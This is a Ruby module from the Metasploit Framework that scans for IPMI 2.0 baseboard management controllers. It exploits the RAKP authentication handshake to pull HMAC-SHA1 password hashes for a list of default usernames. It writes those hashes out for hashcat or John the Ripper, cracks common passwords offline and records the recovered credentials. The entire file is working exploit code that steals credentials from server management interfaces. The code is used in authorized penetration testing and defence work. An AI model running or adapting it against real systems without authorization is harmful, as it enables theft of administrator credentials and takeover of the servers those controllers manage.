#
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'rex/proto/ipmi'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'IPMI 2.0 RAKP Remote SHA1 Password Hash Retreival',
			'Description' => %q|
				This module identifies IPMI 2.0 compatible systems and attempts to retrieve the 
				HMAC-SHA1 password hashes of default usernames. The hashes can be stored in a 
				file using the OUTPUT_FILE option and then cracked using hmac_sha1_crack.rb
				in the tools subdirectory as well hashcat (cpu) 0.46 or newer using type 7300.
				|,
			'Author'      => [ 'Dan Farmer <zen[at]fish2.com>', 'hdm' ],
			'License'     => MSF_LICENSE,
			'References'  => 
				[
					['URL', 'http://fish2.com/ipmi/remote-pw-cracking.html']
				],
			'DisclosureDate' => 'Jun 20 2013'
		)

		register_options(
		[
			Opt::RPORT(623),
			OptPath.new('USER_FILE', [ true, "File containing usernames, one per line",
				File.join(Msf::Config.install_root, 'data', 'wordlists', 'ipmi_users.txt')
			]),
			OptPath.new('PASS_FILE', [ true, "File containing common passwords for offline cracking, one per line",
				File.join(Msf::Config.install_root, 'data', 'wordlists', 'ipmi_passwords.txt')
			]),			
			OptString.new('OUTPUT_HASHCAT_FILE', [false, "Save captured password hashes in hashcat format"]),
			OptString.new('OUTPUT_JOHN_FILE', [false, "Save captured password hashes in john the ripper format"]),
			OptBool.new('CRACK_COMMON', [true, "Automatically crack common passwords as they are obtained", true])
		], self.class)

	end

	def run_host(ip)

		vprint_status("Sending IPMI probes to #{ip}")

		self.udp_sock = Rex::Socket::Udp.create({'Context' => {'Msf' => framework, 'MsfExploit' => self}})
		add_socket(self.udp_sock)
		udp_send(Rex::Proto::IPMI::Utils.create_ipmi_getchannel_probe)
		r = udp_recv(5.0)

		unless r
			vprint_status("#{rhost} No response to IPMI probe")
			return
		end
		
		info = process_getchannel_reply(*r)
		unless info
			vprint_status("#{rhost} Could not understand the response to the IPMI probe")
			return
		end

		unless info.ipmi_compat_20 == 1
			vprint_status("#{rhost} Does not support IPMI 2.0")
			return
		end

		fd = ::File.open(datastore['USER_FILE'], "rb")
		fd.each_line do |line|
			username = line.strip

			console_session_id = Rex::Text.rand_text(4)
			console_random_id  = Rex::Text.rand_text(16)

			vprint_status("#{rhost} Trying username '#{username}'...")

			rakp = nil
			sess = nil

			# It may take multiple tries to get a working "session" on certain BMCs (HP iLO 4, etc)
			1.upto(5) do |attempt|

				r = nil
				1.upto(3) do
					udp_send(Rex::Proto::IPMI::Utils.create_ipmi_session_open_request(console_session_id))
					r = udp_recv(5.0)
					break if r
				end

				unless r
					vprint_status("#{rhost} No response to IPMI open session request")
					rakp = nil 
					break
				end
				
				sess = process_opensession_reply(*r)
				unless sess
					vprint_status("#{rhost} Could not understand the response to the open session request")
					rakp = nil 
					break
				end

				r = nil
				1.upto(3) do
					udp_send(Rex::Proto::IPMI::Utils.create_ipmi_rakp_1(sess.bmc_session_id, console_random_id, username))
					r = udp_recv(5.0)
					break if r
				end

				unless r
					vprint_status("#{rhost} No response to RAKP1 message")
					next
				end
				
				rakp = process_rakp1_reply(*r)
				unless rakp
					vprint_status("#{rhost} Could not understand the response to the RAKP1 request")
					rakp = nil 
					break
				end

				# Sleep and retry on session ID errors
				if rakp.error_code == 2
					vprint_error("#{rhost} Returned a Session ID error for username #{username} on attempt #{attempt}")
					Rex.sleep(1)
					next
				end

				if rakp.error_code != 0
					vprint_error("#{rhost} Returned error code #{rakp.error_code} for username #{username}: #{Rex::Proto::IPMI::RMCP_ERRORS[rakp.error_code].to_s}")
					rakp = nil 
					break
				end

				# TODO: Finish documenting this error field
				if rakp.ignored1 != 0
					vprint_error("#{rhost} Returned error code #{rakp.ignored1} for username #{username}")
					rakp = nil 
					break
				end

				# Break out of the session retry code if we make it here
				break
			end

			# Skip to the next user if we didnt get a valid response
			next if not rakp

			# Calculate the salt used in the hmac-sha1 hash
			hmac_buffer = Rex::Proto::IPMI::Utils.create_rakp_hmac_sha1_salt(
				console_session_id,
				sess.bmc_session_id,
				console_random_id,
				rakp.bmc_random_id,
				rakp.bmc_guid,
				0x14,
				username
			)

			sha1_salt = hmac_buffer.unpack("H*")[0]
			sha1_hash = rakp.hmac_sha1.unpack("H*")[0]

			found = "#{rhost} #{username}:#{sha1_salt}:#{sha1_hash}"
			print_good(found)

			# Write the rakp hash to the output files
			if @output_cat
				@output_cat.write("#{rhost} #{username}:#{sha1_salt}:#{sha1_hash}\n")
			end
			if @output_jtr
				@output_jtr.write("#{rhost} #{username}:$rakp$#{sha1_salt}$#{sha1_hash}\n")
			end

			# Write the rakp hash to the database
			report_auth_info(
				:host	=> rhost,
				:port   => rport,
				:proto  => 'udp',
				:sname	=> 'ipmi',
				:user 	=> username,
				:pass   => "#{sha1_salt}:#{sha1_hash}",
				:source_type => "captured",
				:active => true,
				:type   => 'rakp_hmac_sha1_hash'
			)

			# Offline crack common passwords and report clear-text credentials
			next unless datastore['CRACK_COMMON']

			::File.open(datastore['PASS_FILE'], "rb") do |pfd|
				passwords = pfd.read(pfd.stat.size).split("\n")
				passwords << ""
				passwords.uniq.each do |pass|
					pass = pass.strip
					next unless pass.length > 0
					next unless Rex::Proto::IPMI::Utils.verify_rakp_hmac_sha1(hmac_buffer, rakp.hmac_sha1, pass)
					print_good("#{rhost} Hash for user '#{username}' matches password '#{pass}'")

					# Report the clear-text credential to the database
					report_auth_info(
						:host	=> rhost,
						:port   => rport,
						:proto  => 'udp',
						:sname	=> 'ipmi',
						:user 	=> username,
						:pass   => pass,
						:source_type => "cracked",
						:active => true,
						:type   => 'password'
					)
					break
				end
			end
		end
	end

	def process_getchannel_reply(data, shost, sport)
		shost = shost.sub(/^::ffff:/, '')
		info = Rex::Proto::IPMI::Channel_Auth_Reply.new(data) rescue nil

		# Ignore invalid responses
		return if not info
		return if not info.ipmi_command == 56

		banner = info.to_banner

		print_status("#{shost} #{banner}")

		report_service(
			:host  => rhost,
			:port  => rport,
			:proto => 'udp',
			:name  => 'ipmi',
			:info  => banner
		)

		# TODO:
		# Report a vulnerablity if info.ipmi_user_anonymous has been set
		# Report a vulnerability if ipmi 2.0 and kg is set to default
		# Report a vulnerability if info.ipmi_user_null has been set (null username)

		info
	end

	def process_opensession_reply(data, shost, sport)
		shost = shost.sub(/^::ffff:/, '')
		info = Rex::Proto::IPMI::Open_Session_Reply.new(data) rescue nil
		return if not info
		return if not info.session_payload_type == Rex::Proto::IPMI::PAYLOAD_RMCPPLUSOPEN_REP
		info
	end

	def process_rakp1_reply(data, shost, sport)
		shost = shost.sub(/^::ffff:/, '')
		info = Rex::Proto::IPMI::RAKP2.new(data) rescue nil
		return if not info
		return if not info.session_payload_type == Rex::Proto::IPMI::PAYLOAD_RAKP2
		info
	end

	def setup
		super
		@output_cat = nil
		@output_jtr = nil
		if datastore['OUTPUT_HASHCAT_FILE']
			@output_cat = ::File.open(datastore['OUTPUT_HASHCAT_FILE'], "ab")
		end
		if datastore['OUTPUT_JOHN_FILE']
			@output_jtr = ::File.open(datastore['OUTPUT_JOHN_FILE'], "ab")
		end
	end

	def cleanup
		super
		@output_cat.close if @output_cat
		@output_cat = nil
		@output_jtr.close if @output_jtr
		@output_jtr = nil
	end

	#
	# Helper methods (these didn't quite fit with existing mixins)
	#

	attr_accessor :udp_sock

	def udp_send(data)
		begin
			udp_sock.sendto(data, rhost, datastore['RPORT'], 0)
		rescue ::Interrupt
			raise $!
		rescue ::Exception
		end
	end

	def udp_recv(timeo)
		r = udp_sock.recvfrom(65535, timeo)
		r[1] ? r : nil
	end

	def rhost
		datastore['RHOST']
	end

	def rport
		datastore['RPORT']
	end	

end
